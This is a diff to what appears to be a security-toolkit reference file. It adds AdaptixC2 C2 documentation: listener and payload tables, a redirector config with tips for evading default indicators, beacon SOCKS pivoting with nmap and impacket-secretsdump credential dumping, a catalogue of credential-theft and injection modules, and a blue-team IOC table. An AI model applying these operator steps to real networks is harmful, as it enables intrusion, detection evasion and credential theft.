@@ -3719,6 +3719,12 @@ var TOOLKIT = [
             ]
           },
           {
+            "title": "Architecture at a glance",
+            "type": "figure",
+            "caption": "Operators run the Qt client and connect to the team server over TLS (default :4321/endpoint). The team server loads listeners from its profile; agents call back to a listener — often through a disposable redirector — and can link to peer agents over SMB or TCP for internal pivoting.",
+            "svg": "<svg viewBox='0 0 900 360' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixC2 architecture diagram: operators connect to the team server over TLS; agents call back through a redirector to listeners on the team server; agents link to peer agents over SMB or TCP.'><defs><marker id='axar' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='7' markerHeight='7' orient='auto-start-reverse'><path d='M0 0 L10 5 L0 10 z' fill='var(--accent)'/></marker><style>.b{fill:var(--surface);stroke:var(--border);stroke-width:1.5}.t{fill:var(--text);font-family:inherit;font-size:14px;font-weight:600}.s{fill:var(--muted);font-family:inherit;font-size:11.5px}.lab{fill:var(--muted);font-family:inherit;font-size:11px}.ln{stroke:var(--accent);stroke-width:2;fill:none;marker-end:url(#axar)}.peer{stroke:var(--muted);stroke-width:1.5;stroke-dasharray:5 4;fill:none;marker-end:url(#axar)}</style></defs><rect class='b' x='14' y='140' width='150' height='80' rx='10'/><text class='t' x='89' y='172' text-anchor='middle'>Operators</text><text class='s' x='89' y='192' text-anchor='middle'>AdaptixClient</text><text class='s' x='89' y='207' text-anchor='middle'>(multiplayer)</text><rect class='b' x='238' y='104' width='200' height='152' rx='10'/><text class='t' x='338' y='134' text-anchor='middle'>Team Server</text><text class='s' x='338' y='156' text-anchor='middle'>adaptixserver</text><text class='s' x='338' y='174' text-anchor='middle'>profile.yaml</text><text class='s' x='338' y='192' text-anchor='middle'>extenders /</text><text class='s' x='338' y='207' text-anchor='middle'>listeners</text><text class='s' x='338' y='229' text-anchor='middle'>TLS cert + key</text><rect class='b' x='512' y='140' width='140' height='80' rx='10'/><text class='t' x='582' y='174' text-anchor='middle'>Redirector</text><text class='s' x='582' y='194' text-anchor='middle'>(reverse proxy)</text><rect class='b' x='724' y='66' width='162' height='74' rx='10'/><text class='t' x='805' y='96' text-anchor='middle'>Beacon agent</text><text class='s' x='805' y='116' text-anchor='middle'>Windows</text><rect class='b' x='724' y='220' width='162' height='74' rx='10'/><text class='t' x='805' y='250' text-anchor='middle'>Gopher agent</text><text class='s' x='805' y='270' text-anchor='middle'>Linux / macOS</text><line class='ln' x1='164' y1='180' x2='236' y2='180'/><text class='lab' x='200' y='170' text-anchor='middle'>TLS :4321</text><text class='lab' x='200' y='196' text-anchor='middle'>/endpoint</text><line class='ln' x1='438' y1='180' x2='510' y2='180'/><text class='lab' x='474' y='172' text-anchor='middle'>listeners</text><line class='ln' x1='652' y1='168' x2='722' y2='110'/><text class='lab' x='690' y='128' text-anchor='middle'>C2</text><line class='ln' x1='652' y1='192' x2='722' y2='252'/><text class='lab' x='690' y='238' text-anchor='middle'>C2</text><line class='peer' x1='805' y1='140' x2='805' y2='220'/><text class='lab' x='812' y='184' text-anchor='start'>SMB / TCP</text><text class='lab' x='812' y='198' text-anchor='start'>peer (link)</text></svg>"
+          },
+          {
             "title": "Install & build (Linux)",
             "type": "commands",
             "commands": [
@@ -3733,6 +3739,30 @@ var TOOLKIT = [
               {
                 "label": "Note on the Go fork",
                 "cmd": "# the pre-install script also fetches Adaptix's go-win7 fork, used to compile\n# the Gopher agent with Windows 7 support. A Docker build (make docker-build-all)\n# is available if you don't want to install the toolchains on the host."
+              }
+            ]
+          },
+          {
+            "title": "Alternative — build/run with Docker",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Build server + extenders without installing toolchains",
+                "cmd": "# the repo ships a Dockerfile + docker-compose.yml with build profiles\nmake docker-build-server-ext      # builds adaptixserver + extenders in a container\nmake docker-build-client          # builds the client as an AppImage\nmake docker-build-all             # server + extenders"
+              },
+              {
+                "label": "Run the server as a container",
+                "cmd": "make docker-up        # start the runtime container (detached)\nmake docker-logs      # follow logs\nmake docker-down      # stop it\n# handy on a VPS where you don't want Go/Qt/mingw on the host."
+              }
+            ]
+          },
+          {
+            "title": "Keeping it current",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Update and rebuild",
+                "cmd": "cd AdaptixC2\ngit pull\nmake all          # rebuild server, client and extenders\n# AdaptixC2 moves fast; new agent/listener features ship as extenders, so\n# rebuild the extenders after pulling. Contributions target the 'dev' branch."
               }
             ]
           },
@@ -3807,6 +3837,98 @@ var TOOLKIT = [
               {
                 "label": "3. Run it on the target, then interact",
                 "cmd": "# execute the agent on the target host -> it checks in and appears in the Agents\n# table. Right-click the agent -> Console (Interact) to open its task console."
+              }
+            ]
+          },
+          {
+            "title": "Listener types & configuration",
+            "type": "table",
+            "columns": [
+              "Listener",
+              "Transport & what you configure"
+            ],
+            "rows": [
+              [
+                "BeaconHTTP / HTTPS",
+                "The workhorse. Bind host/port + callback addresses, GET or POST, the URI list, User-Agent list, the heartbeat header (default X-Beacon-Id), a hex encryption key, optional SSL (cert/key), Host/Request/Server headers, Trust X-Forwarded-For, and custom 404 (error) and payload pages for traffic shaping."
+              ],
+              [
+                "BeaconSMB",
+                "Peer-to-peer over a named pipe — no direct egress. The agent is reached from another agent by pipe name (link smb). Ideal for internal hosts with no outbound route."
+              ],
+              [
+                "BeaconTCP",
+                "Peer-to-peer over a raw TCP port, reached with link tcp. The other internal pivoting option."
+              ],
+              [
+                "BeaconDNS / DoH",
+                "C2 over DNS (direct UDP), DNS-over-HTTPS, or either with fallback — slow but often permitted outbound. DNS burst mode tunes throughput."
+              ],
+              [
+                "Gopher (TCP / mTLS)",
+                "The listener for the Gopher agent (Linux/macOS), plain TCP or mutually-authenticated TLS."
+              ]
+            ]
+          },
+          {
+            "title": "Payload / agent generation",
+            "type": "table",
+            "columns": [
+              "Build option",
+              "Choices"
+            ],
+            "rows": [
+              [
+                "Agent",
+                "Beacon (Windows) or Gopher (Linux/macOS). Third-party agents (e.g. Kharon) register the same way."
+              ],
+              [
+                "Listener",
+                "Which listener this agent calls back to — bound at build time."
+              ],
+              [
+                "Architecture",
+                "x64 or x86."
+              ],
+              [
+                "Format",
+                "Exe, Service Exe (with a service name), DLL, or raw Shellcode."
+              ],
+              [
+                "Sleep (jitter %)",
+                "Initial check-in interval and jitter, adjustable later with sleep."
+              ],
+              [
+                "Transport extras",
+                "Per-listener: DNS mode (Direct/DoH/fallback) and resolvers, an outbound HTTP/HTTPS proxy (server + creds), and callback rotation (sequential / random)."
+              ]
+            ]
+          },
+          {
+            "title": "Redirector & traffic shaping",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Why",
+                "cmd": "# never expose the team server directly. A redirector is a cheap, disposable\n# host that forwards only valid beacon traffic (matching your HTTP profile) to\n# the team server and shows a decoy to everything else — rotate it when burned."
+              },
+              {
+                "label": "Apache mod_rewrite redirector (match your listener's URIs)",
+                "cmd": "RewriteEngine On\n# forward only the URIs/UA your BeaconHTTP listener uses, else serve a decoy\nRewriteCond %{REQUEST_URI} ^/(api/v1/status|updates/check\\.php|content\\.html)$ [NC]\nRewriteRule ^.*$ https://TEAMSERVER%{REQUEST_URI} [P,L]\nRewriteRule ^.*$ https://decoy-site.example/ [R=302,L]"
+              },
+              {
+                "label": "Shape the listener so it isn't default",
+                "cmd": "# in the BeaconHTTP listener config, change from the shipped defaults:\n#   URIs        -> your own paths (defaults /api/v1/status, /updates/check.php, /content.html)\n#   User-Agent  -> a realistic UA (default is an old Firefox/20 string — a known IOC)\n#   Headers     -> set believable Server/Host/Request headers\n#   Error page  -> replace the default 404 page (also fingerprinted)\n#   Heartbeat   -> rename the X-Beacon-Id header"
+              }
+            ]
+          },
+          {
+            "title": "Pivoting with SOCKS + proxychains",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Open a SOCKS proxy through a beacon and run tools over it",
+                "cmd": "# in the beacon console — start a SOCKS5 proxy on the team server:\nsocks start 1080 -auth user pass\n# point proxychains at it (/etc/proxychains.conf):\n#   socks5 127.0.0.1 1080 user pass\nproxychains -q nmap -sT -Pn -n -p 445,3389 10.10.20.0/24\nproxychains -q impacket-secretsdump CORP/user@10.10.20.5\n# forward a single internal service instead of a full proxy:\nrportfwd start 8443 10.10.20.5 443     # reach 10.10.20.5:443 via the team server"
               }
             ]
           },
@@ -4114,12 +4236,58 @@ var TOOLKIT = [
             ]
           },
           {
+            "title": "Extension-Kit — module catalogue",
+            "type": "table",
+            "columns": [
+              "Module",
+              "What it adds (selected commands)"
+            ],
+            "rows": [
+              [
+                "AD-BOF",
+                "Active Directory enum & attacks: ldapsearch/adsi/ldapq, kerberoasting, asreproasting, asktgt/asktgs, Kerbeus, ADCS (certi), LDAP/SQL (mssql) BOFs, trust & object discovery."
+              ],
+              [
+                "Creds-BOF",
+                "Credential theft: nanodump (incl. PPL dump/medic), lsadump_sam/secrets/cache, hashdump, cookie-monster (browser cookies), askcreds."
+              ],
+              [
+                "Elevation-BOF",
+                "Privilege escalation to SYSTEM: getsystem (token), UAC bypasses (SSPI, regshell), DCOMPotato, PrintSpoofer, alwayselevated check."
+              ],
+              [
+                "Execution-BOF",
+                "In-memory execution: execute-assembly (.NET), No-Consolation, CLR enable/disable, shellcode runners."
+              ],
+              [
+                "Injection-BOF",
+                "Process injection variants: inject-sec, inject-cfg, inject-poolparty, inject-32to64, spoofing helpers."
+              ],
+              [
+                "LateralMovement-BOF",
+                "Move between hosts: jump (service/schtask/wmi style), remote execution helpers."
+              ],
+              [
+                "Postex-BOF",
+                "Post-exploitation: screenshot, clipboard, env, netstat/arp/ipconfig, autorun & service modification."
+              ],
+              [
+                "Process-BOF",
+                "Process work: listing, handles, token info, process manipulation."
+              ],
+              [
+                "SAL-BOF / SAR-BOF",
+                "Situational Awareness (Local / Remote): host and network recon one-liners (firewall rules, shares, sessions, RPC checks)."
+              ]
+            ]
+          },
+          {
             "title": "Load an extension in the client",
             "type": "commands",
             "commands": [
               {
-                "label": "Option 1 — load at runtime from the client",
-                "cmd": "# clone the official kit (or your own scripts)\ngit clone https://github.com/Adaptix-Framework/Extension-Kit\n# In the client:  Extender panel  ->  Load  ->  select the .axs\n#   load Extension-Kit/extension-kit.axs to pull in every module at once.\n# New commands appear in the beacon console and right-click menus immediately."
+                "label": "Option 1 — build the kit, then load it in the client",
+                "cmd": "# install the BOF build deps and compile the modules:\napt install g++-mingw-w64-x86-64-posix gcc-mingw-w64-x86-64-posix mingw-w64-tools\ngit clone https://github.com/Adaptix-Framework/Extension-Kit\ncd Extension-Kit && make\n# In the client:  Main menu -> AxScript -> Script manager -> (context menu) Load new\n#   select Extension-Kit/extension-kit.axs to pull in every module at once.\n# New commands appear in the beacon console and right-click menus immediately."
               },
               {
                 "label": "Option 2 — auto-load at team-server start",
@@ -4145,8 +4313,84 @@ var TOOLKIT = [
               },
               {
                 "label": "3. Load myext.axs in the client",
-                "cmd": "# Extender panel -> Load -> myext.axs\n# 'whoami-bof' is now available in the beacon console; running it compiles the\n# args with bof_pack and tasks the agent with: execute bof \"..._bin/whoami.x64.o\" <packed>"
+                "cmd": "# Main menu -> AxScript -> Script manager -> Load new -> myext.axs\n# 'whoami-bof' is now available in the beacon console; running it compiles the\n# args with bof_pack and tasks the agent with: execute bof \"..._bin/whoami.x64.o\" <packed>"
               }
+            ]
+          },
+          {
+            "title": "Troubleshooting & gotchas",
+            "type": "table",
+            "columns": [
+              "Symptom",
+              "Cause / fix"
+            ],
+            "rows": [
+              [
+                "Server exits: cert/profile not found",
+                "Run ./adaptixserver from INSIDE dist/ — the profile's cert/key and the extenders are relative paths resolved from the working directory."
+              ],
+              [
+                "Listener won't load / 'extender not found'",
+                "Build the extenders first (make extenders) so dist/extenders/* exist, and make sure each is listed under extenders: in profile.yaml."
+              ],
+              [
+                "Client won't connect",
+                "Endpoint must match the profile (/endpoint), use the right port (4321), confirm the server is listening (ss -tlnp | grep 4321) and the firewall allows it, and accept the self-signed cert on first connect."
+              ],
+              [
+                "Gopher agent / server build fails",
+                "The server build uses Adaptix's go-win7 Go fork for the Gopher agent — let pre_install_linux_all.sh server set it up, or use the Docker build."
+              ],
+              [
+                "Client build fails",
+                "Needs Qt6 dev packages + cmake — run ./pre_install_linux_all.sh client (or build the client AppImage via Docker)."
+              ],
+              [
+                "Anyone can log in",
+                "Change the default password \"pass\" in profile.yaml before first start; 4321 is widely scanned."
+              ],
+              [
+                "Agent runs but no check-in",
+                "Arch (x64/x86) or format must suit the target; Service Exe needs a service name; the agent's callback host must be reachable (redirector/listener up)."
+              ]
+            ]
+          },
+          {
+            "title": "Detection & IOCs (blue team)",
+            "type": "table",
+            "columns": [
+              "Default artefact",
+              "What to hunt for"
+            ],
+            "rows": [
+              [
+                "Response headers",
+                "Server: AdaptixC2 and an Adaptix-Version header come from the default profile — a high-signal hunt until operators change them."
+              ],
+              [
+                "Heartbeat header",
+                "Beacon check-ins carry the default X-Beacon-Id request header."
+              ],
+              [
+                "User-Agent",
+                "Default UA is the ancient 'Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0' (Firefox/20) — rare in real traffic."
+              ],
+              [
+                "URIs",
+                "Default BeaconHTTP URIs /api/v1/status, /updates/check.php, /content.html; Unit42 also observed POST to /uri.php with X-Beacon-Id."
+              ],
+              [
+                "Ports",
+                "Team-server/operator port 4321 by default; HTTP listeners commonly 443/4443."
+              ],
+              [
+                "404 / error page",
+                "The shipped dark-themed '404 - Page Not Found' page is fingerprintable when left default."
+              ],
+              [
+                "Network pivoting",
+                "Censys/Hunt.io cluster servers by TLS certificate, JARM, and response-header hash — useful for finding related infrastructure."
+              ]
             ]
           },
           {
@@ -4175,6 +4419,18 @@ var TOOLKIT = [
               {
                 "label": "Extension-Kit (extra listeners, agents, BOFs)",
                 "url": "https://github.com/Adaptix-Framework/Extension-Kit"
+              },
+              {
+                "label": "Unit 42 — AdaptixC2 in real-world attacks (detection)",
+                "url": "https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/"
+              },
+              {
+                "label": "Hunt.io — AdaptixC2 capabilities, tactics & hunting",
+                "url": "https://hunt.io/blog/adaptixc2-uncovered-capabilities-tactics-hunting"
+              },
+              {
+                "label": "Censys — fingerprinting AdaptixC2 at scale",
+                "url": "https://censys.com/blog/adaptixc2-open-source-c2-framework/"
               },
               {
                 "label": "Theory — Command & Control (C2) Frameworks",
